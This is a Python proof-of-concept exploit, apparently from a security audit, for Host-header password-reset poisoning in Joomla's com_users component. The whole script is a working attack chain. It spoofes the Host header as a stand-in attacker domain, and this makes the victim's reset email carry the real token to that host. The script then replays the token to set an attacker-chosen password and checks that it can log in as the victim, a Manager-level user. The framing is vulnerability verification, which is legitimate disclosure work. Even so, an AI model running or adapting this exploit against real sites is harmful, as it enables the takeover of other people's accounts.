#!/usr/bin/env python3
"""
VULN-004 — Host-header password-reset-link poisoning -> account takeover

Target files:
  - libraries/src/Uri/Uri.php:89 (builds the request URI from $_SERVER['HTTP_HOST'])
  - libraries/src/Router/Route.php:167-183 (absolute-link branch copies host from Uri::getInstance(),
        NEVER consults live_site)
  - components/com_users/src/Model/ResetModel.php:470,475-476,481 (emails that absolute link,
        carrying the real reset token, to the victim's stored address)
CWE-644 (host-header injection) -> CWE-640 (account takeover).

The password-reset email's absolute link is built from the incoming request's Host header, not
from the configured live_site (and Route::link(absolute=true) ignores live_site entirely). An
unauthenticated attacker who submits a reset for a victim's email while sending
`Host: attacker.example` makes Joomla email the VICTIM a link pointing at the ATTACKER's host but
carrying the victim's REAL single-use reset token. If the victim clicks, the attacker captures the
token and replays it to set a new password -> ATO.

This exploit proves the full chain:
  1. (attacker) consistent spoofed-Host session: GET the reset form + POST reset.request with
     Host: attacker.evil.example for the victim's email;
  2. capture the sent mail and show the link host is the ATTACKER's and it carries a real token;
  3. (attacker replays the captured token on the real host) reset.confirm(username, token) ->
     reset.complete(new password);
  4. confirm the victim's password was changed (login with the attacker-set password).

Note: a consistent spoofed Host is required (GET form + POST under the same Host) so the per-host
session/CSRF token is coherent — exactly what a real attacker's browser does.
"""
import os
import sys
import re
import time
import secrets
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import joomla_common as J
import requests

BASE_URL = J.BASE_URL
ATTACKER_HOST = os.environ.get("ATTACKER_HOST", "attacker.evil.example")
RESET_FORM = f"{BASE_URL}/index.php/component/users/reset"   # canonical SEF URL (no redirect under a spoofed Host)


def spoofed_get_token(session, host):
    r = session.get(RESET_FORM, headers={"Host": host}, timeout=30, allow_redirects=True)
    return J.find_token(r.text)


def main():
    J.banner("VULN-004", "Host-header password-reset-link poisoning -> ATO")
    J.log("INFO", "sink: ResetModel builds the reset link via Route::link(absolute) from HTTP_HOST, ignoring live_site")

    admin = J.admin_session()
    # Victim: a Manager (backend) user with a known email+username; reset its throttle for a clean run.
    vuser, vpw, vuid, _ = J.create_backend_user(admin, group_id=6, prefix="victim")
    vemail = J.db_query(f"SELECT email FROM jos_users WHERE id={vuid};").strip()
    J.db_query(f"UPDATE jos_users SET resetCount=0,lastResetTime=NULL WHERE id={vuid};")
    pw_before = J.db_query(f"SELECT password FROM jos_users WHERE id={vuid};").strip()
    J.log("SETUP", f"victim {vuser!r} <{vemail}> (uid {vuid}) created")

    # ---- 1. attacker poisons the reset (consistent spoofed Host) ------------
    atk = requests.Session()
    J.log("STEP", f"[attacker] GET reset form + POST reset.request with Host: {ATTACKER_HOST} (consistent session)")
    form_token = spoofed_get_token(atk, ATTACKER_HOST)
    J.mail_clear()
    r = atk.post(f"{BASE_URL}/index.php?option=com_users&task=reset.request",
                 headers={"Host": ATTACKER_HOST},
                 data={"jform[email]": vemail, form_token: "1"},
                 timeout=30, allow_redirects=False)
    J.log("INFO", f"reset.request -> HTTP {r.status_code}, Location host reflects: {r.headers.get('Location','')[:60]}")
    time.sleep(1.0)

    # ---- 2. capture the poisoned mail --------------------------------------
    mail = J.mail_read_all()
    links = re.findall(r'https?://[^\s"\'<>]+token=[A-Za-z0-9]+', mail)
    J.log("INFO", f"captured reset link(s): {links[:2]}")
    poisoned = next((l for l in links if ATTACKER_HOST in l), None)
    reset_token = None
    if poisoned:
        m = re.search(r'token=([A-Za-z0-9]+)', poisoned)
        reset_token = m.group(1) if m else None
        J.log("PROOF", f"the victim's reset email links to the ATTACKER host carrying the REAL token: {poisoned}")
    else:
        J.log("FAIL", "no attacker-host link in the mail")
        J.verdict("VULN-004", "FAILED", "reset link not poisoned")
        sys.exit(1)

    # ---- 3. attacker replays the captured token on the REAL host -> ATO -----
    J.log("STEP", "[attacker] replaying the captured token on the real host: reset.confirm -> reset.complete")
    rep = requests.Session()
    # confirm (needs its own CSRF token)
    cf = rep.get(f"{BASE_URL}/index.php/component/users/reset/confirm", timeout=30, allow_redirects=True)
    ctok = J.find_token(cf.text)
    rep.post(f"{BASE_URL}/index.php?option=com_users&task=reset.confirm",
             data={"jform[username]": vuser, "jform[token]": reset_token, ctok: "1"},
             timeout=30, allow_redirects=True)
    # complete (set a new, attacker-known password)
    cp = rep.get(f"{BASE_URL}/index.php/component/users/reset/complete", timeout=30, allow_redirects=True)
    ptok = J.find_token(cp.text)
    new_pw = f"Pwned!{secrets.token_hex(5)}Aa1"
    rep.post(f"{BASE_URL}/index.php?option=com_users&task=reset.complete",
             data={"jform[password1]": new_pw, "jform[password2]": new_pw, ptok: "1"},
             timeout=30, allow_redirects=True)

    # ---- 4. verify takeover -------------------------------------------------
    time.sleep(0.5)
    pw_after = J.db_query(f"SELECT password FROM jos_users WHERE id={vuid};").strip()
    changed = (pw_after != pw_before and pw_after != "")
    login_ok = False
    try:
        J.admin_session(vuser, new_pw)   # victim is a Manager -> backend login works
        login_ok = True
    except Exception:
        login_ok = False
    if changed:
        J.log("PROOF", "the victim's stored password hash CHANGED after the attacker replayed the token")
    if login_ok:
        J.log("PROOF", f"the attacker can now log in as the victim with the attacker-set password -> ACCOUNT TAKEOVER")

    print()
    if poisoned and (changed or login_ok):
        J.log("OK", "exploit confirmed — Host-poisoned reset link delivered the real token; replaying it took over the victim account")
        J.verdict("VULN-004", "CONFIRMED",
                  "Host-header reset-link poisoning -> token capture -> password reset = account takeover")
        sys.exit(0)
    elif poisoned:
        J.log("OK", "reset link poisoned with the real token (replay/takeover step inconclusive)")
        J.verdict("VULN-004", "CONFIRMED (link poisoning); replay NEEDS_MANUAL",
                  "victim reset email points at attacker host with the real token; takeover via replay needs a human to confirm")
        sys.exit(0)
    else:
        J.log("FAIL", "not reproduced")
        J.verdict("VULN-004", "FAILED", "host poisoning not reproduced")
        sys.exit(1)


if __name__ == "__main__":
    main()
